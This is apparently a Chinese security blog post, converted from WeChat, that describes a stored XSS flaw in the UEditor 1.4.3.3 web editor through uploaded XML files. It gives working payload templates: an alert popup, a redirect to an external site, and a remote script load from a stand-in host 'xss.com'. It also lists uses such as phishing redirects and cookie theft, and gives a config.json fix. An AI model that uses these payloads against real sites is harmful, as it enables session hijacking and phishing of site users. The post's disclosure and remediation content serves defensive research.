\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzAxMzg4NDg1NA==&mid=2247484014&idx=1&sn=456750ac618e992f59476173441ce0f1&chksm=9b9a8eb7aced07a14ba1d71602faabafaa3fea898c0d8f6a75e5b1dd5393c0fcd520027ace95&mpshare=1&scene=1&srcid=1013988WS4r6iiFhnhQwQgBI&sharer\_sharetime=1602549213049&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=68e9243f129238454bc3624948fc63c450fccca27c8899d461e4e2d740e200f016569ea52d151eed47b2d388461e2c5b6c8f3879ca1315b159a23e03fa0e87e5ef8297bc3bba301ddaa34c1f87238a3b21f3953bbb494d2ebcdfc82386915edf41e8753327229009446dd94f73a53254fc357ded25ac20e986aad99523c9f7e1&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AZ%2Bwcl5mEJlHUAHFxcMASvA%3D&pass\_ticket=2G6SwO4uyYCX4aTiQDJvW1D1IrAJXn1CnpH%2BbX1rykSOMZNKPaotYwa2vyHnTBud&wx\_header=0)

上个月测试某个系统碰到了，以为是 0day，Google 了下发现早已有人发过了。见：

https://blog.csdn.net/qq\_39101049/article/details/97684968  

**下载源码并搭建环境**  

----------------

测试版本：php 版 v1.4.3.3，jsp 版 (当时忘了看版本)

下载地址：https://github.com/fex-team/ueditor

IP：192.168.10.1

自定义的目录：ueditor1433(实际过程中请注意观察)

不用安装和配置，直接打开就用，不过上传文件的路径需要注意下

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5rLahQ3akyic6RXoAtrW0qAz7yLcqR5YqVlC037HEWnuyHibgkLdrY20Q/640?wx_fmt=png)

**测试过程**
--------

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5m5GhicA5uQrMpMxR5bLARnqb6MoSVVshzZly1icP6qmmdwTyPMP35JkA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb56Df3KkdXFSDNuz1wSA1H21B69lluuJqJqkS67tZp2q7fFys4xYSSVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5QFLduMksqQtxk4jvUnutZXp14PtYdFJKtJ0d10NKdrx1mOpTNeicHSw/640?wx_fmt=png)

访问触发弹窗，可以改成下面其他代码测试

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5nw1SGZZHKpdUic6NOnRzFyFDL8VXCCsmTkuDD1MEUFYGJbcZgumLwtg/640?wx_fmt=png)

有时候上传访问不了找不到路径可以访问如下 url 把文件目录列出来再拼接，实际过程中请注意 controller.xxx 的访问路径

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
URL跳转
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
window.location.href="https://www.t00ls.net/";
</something:script>
</body>
</html>
远程加载Js
<html>
<head></head>
<body>
<something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml">
</something:script>
</body>
</html>
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5snIbPTmWKUb01kBj8ChVwZrc2X8ubmQNicMlNcKFMjMhy2R710uDjxA/640?wx_fmt=png)

**常见利用代码**
----------

```
弹窗
```

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
URL跳转
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
window.location.href="https://www.t00ls.net/";
</something:script>
</body>
</html>
远程加载Js
<html>
<head></head>
<body>
<something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml">
</something:script>
</body>
</html>
```

**漏洞修复**
--------

可以看到在 config.json 配置文件里 xml 文件类型默认是可被上传的，所以去掉重启下应用或者服务器就好了

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5eZRSibUMWZnvibBtMf3Xq7bueTz7IiaSz8lOocWh5IADoTtTdtuRoXkAQ/640?wx_fmt=png)

**实战意义**
--------

个人认为这个洞危害不是很大，不过可应用于以下实战场景，如果有其他好玩的场景或者组合拳大牛萌可以回复

*   **安服仔实在没漏洞的时候凑漏洞**
    
*   **URL 跳转钓鱼**
    
*   **远程加载 js 打 Cookie 或者其他操作**